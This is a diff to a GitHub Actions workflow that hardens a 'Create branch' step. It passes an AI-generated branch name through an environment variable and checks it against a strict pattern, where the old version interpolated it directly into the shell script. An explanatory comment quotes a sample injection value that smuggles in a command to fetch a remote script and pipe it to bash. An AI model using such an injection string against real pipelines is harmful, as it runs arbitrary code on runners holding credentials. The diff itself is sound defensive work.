@@ -232,7 +232,23 @@ jobs:
           token: ${{ steps.app-token.outputs.token }}
 
       - name: Create branch
-        run: git checkout -B "${{ matrix.branch }}"
+        env:
+          BRANCH: ${{ matrix.branch }}
+        # BRANCH is Claude-authored (the cluster job's structured output, only constrained
+        # to `"type":"string"` by the JSON schema) — it must go through env: rather than
+        # inline ${{ }} interpolation into the run: script, which would be a script
+        # injection (a value like `foo"; curl evil.sh|bash; echo "` executing arbitrary
+        # commands on a runner already holding the App token). The pattern check is
+        # defense-in-depth: also refuses a value that happens to collide with a real
+        # branch (e.g. "main"), which would silently commit onto it instead of a fresh
+        # branch.
+        run: |
+          set -euo pipefail
+          if ! [[ "$BRANCH" =~ ^bot/issue-build-[A-Za-z0-9._-]+$ ]]; then
+            echo "::error::cluster branch name '$BRANCH' doesn't match the expected bot/issue-build-<id> pattern — refusing to check it out"
+            exit 1
+          fi
+          git checkout -B "$BRANCH"
 
       - name: Claude — implement the cluster
         id: claude
